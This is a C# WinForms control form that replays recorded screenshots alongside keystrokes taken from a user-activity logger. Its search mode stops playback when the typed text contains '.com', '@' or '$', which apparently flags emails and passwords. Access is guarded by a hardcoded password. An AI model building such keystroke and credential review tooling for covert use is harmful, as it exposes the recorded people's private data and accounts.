using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using UserActivityLogger;
using Recorder;

namespace RecordSession
{
    public partial class frmControlBox : Form
    {
        frmPictureViewer _pictureViewerFrom = null;
        QueueWithCapacity _queueWithCapacity = new QueueWithCapacity(80);
        private bool Search = false;

        string[] _serachWords = new[] { ".com", "@", "$", "*", "-" };
        public frmControlBox()
        {
            InitializeComponent();
          
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            _pictureViewerFrom.Index = trackBar1.Value;
            _pictureViewerFrom.ChangeNextImagePostion(trackBar1.Value);
        }

        private void OnIndexChange(int index)
        {
            trackBar1.Value = index;
            _pictureViewerFrom.ChangeNextImagePostion(trackBar1.Value);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (txtPassword.Text != "1234test!")
            {
                MessageBox.Show("You Miss Something");
                return;
            }

            Search = false;
            btnSearch.Enabled = true;

            if (_pictureViewerFrom != null)
            {
                try
                {
                    _pictureViewerFrom.Close();
                }
                catch { }
            }
            trackBar1.Value = 0;

            if (!Directory.Exists(textBox1.Text.Trim()))
            {
                MessageBox.Show("Empty Path");
                return;
            }

            _pictureViewerFrom = new frmPictureViewer();
            _pictureViewerFrom.timer2.Interval = (int)UpDownTimer.Value;
            _pictureViewerFrom.OnCommentsFetched = OnCommentsFetched;
            _pictureViewerFrom.DisplayChange = new Action<int>(DisplayChange);
            _pictureViewerFrom.OnIndexChanged = new Action<int>(OnIndexChange);
            _pictureViewerFrom.WindowState = FormWindowState.Maximized;
            _pictureViewerFrom.Show();

            trackBar1.Maximum = _pictureViewerFrom.Play(textBox1.Text);
            trackBar1.Minimum = 0;
            lblMaxValue.Text = trackBar1.Maximum.ToString();

           //var frmVideoController = new VideoControlBox(_pictureViewerFrom, trackBar1.Maximum);
           // frmVideoController.Show();


            SetOpacity();
           // this.WindowState = FormWindowState.Minimized;
        }

        double _Opacity = 1;
        private void SetOpacity()
        {
            try
            {
                this.Opacity = _Opacity;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        private void OnCommentsFetched(string comments)
        {
            if (String.IsNullOrEmpty(comments))
            {
                txtKeysLogged.Text = string.Empty;
                return;
            }

            KeyProcessor processor = new KeyProcessor();

            var processedKeyData = processor.ProcessKeys(comments);
            txtKeysLogged.Text += processedKeyData.ProcessedData + processedKeyData.UnProcessedData;
            txtUnProcessedKey.Text += processedKeyData.UnProcessedData;
            _queueWithCapacity.Add(processedKeyData.ProcessedData);
            txtCurrentText.Text = _queueWithCapacity.GetText();
            txtKeysLogged.SelectionStart = txtKeysLogged.Text.Length;
            txtKeysLogged.ScrollToCaret();

            if (Search)
            {
                SearchText(processedKeyData.ProcessedData);
            }
        }

        private void SearchText(string text)
        {
            for (var i = 0; i < _serachWords.Length; i++)
            {
                if (text.IndexOf(_serachWords[i]) > -1)
                {
                    _pictureViewerFrom.timer2.Enabled = false;

                    btnSearch.Enabled = true;
                    Search = false;
                    break;
                }
            }
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            this.TopMost = true;
            Application.ThreadException += new ThreadExceptionEventHandler(MyCommonExceptionHandlingMethod);
        }

        private void trackBar1_MouseDown(object sender, MouseEventArgs e)
        {
            _pictureViewerFrom.timer2.Enabled = false;
        }

        private void DisplayChange(int index)
        {
            try
            {
                trackBar1.Value = index;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void trackBar1_MouseUp(object sender, MouseEventArgs e)
        {
            _pictureViewerFrom.timer2.Enabled = true;
        }

        private void btnPause_Click(object sender, EventArgs e)
        {
            if (_pictureViewerFrom.timer2.Enabled)
            {
                btnPause.Text = "Ressume";
                _pictureViewerFrom.timer2.Enabled = false;
            }
            else
            {
                btnPause.Text = "Pause";
                _pictureViewerFrom.timer2.Interval = (int)UpDownTimer.Value;
                _pictureViewerFrom.timer2.Enabled = true;
            }

        }

        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
        {

        }

        private void Form2_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyValue == 39)
                {
                    trackBar1.Value += 1;
                    _pictureViewerFrom.Index = trackBar1.Value;

                }
                if (e.KeyValue == 37)
                {
                    trackBar1.Value -= 1;
                    _pictureViewerFrom.Index = trackBar1.Value;
                }

                if (e.KeyCode == Keys.Escape)
                {
                    _pictureViewerFrom.MinimizeWindow();
                }
            }
            catch { }
        }

        private void UpDownTimer_ValueChanged(object sender, EventArgs e)
        {
            if (_pictureViewerFrom != null)
            {
                _pictureViewerFrom.timer2.Interval = (int)UpDownTimer.Value;
            }
        }

        private void UpDownSilde_ValueChanged(object sender, EventArgs e)
        {
            _pictureViewerFrom.incrementCount = (int)UpDownSilde.Value;
        }

        private void chkBackWard_CheckedChanged(object sender, EventArgs e)
        {
            if (chkBackWard.Checked)
                _pictureViewerFrom.incrementCount = -System.Math.Abs(_pictureViewerFrom.incrementCount);
            else
                _pictureViewerFrom.incrementCount = System.Math.Abs(_pictureViewerFrom.incrementCount);

        }
        private static void MyCommonExceptionHandlingMethod(object sender, ThreadExceptionEventArgs t)
        {
            MessageBox.Show(t.Exception.Message);
        }

        private void btnOPenFile_Click(object sender, EventArgs e)
        {
            try
            {
                var rs = openFileDialog1.ShowDialog();
                if (rs == DialogResult.OK)
                {
                    textBox1.Text = Path.GetDirectoryName(openFileDialog1.FileName);
                }
            }

            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void btnClearTextBox_Click(object sender, EventArgs e)
        {
            txtKeysLogged.Text = string.Empty;
        }

        private void trackBar1_ValueChanged(object sender, EventArgs e)
        {
            lblCurrentValue.Text = trackBar1.Value.ToString();
        }


        private void btnSearch_Click(object sender, EventArgs e)
        {
            Search = true;
            _pictureViewerFrom.timer2.Interval = 5;
            _pictureViewerFrom.timer2.Enabled = true;
            btnSearch.Enabled = false;

            //if (_pictureViewerFrom.timer2.Enabled)
            //{
            //    btnPause.Text = "Ressume";
            //    _pictureViewerFrom.timer2.Enabled = false;
            //}
            //else
            //{
            //    btnPause.Text = "Pause";
            //    _pictureViewerFrom.timer2.Enabled = true;
            //}
        }
    }
}
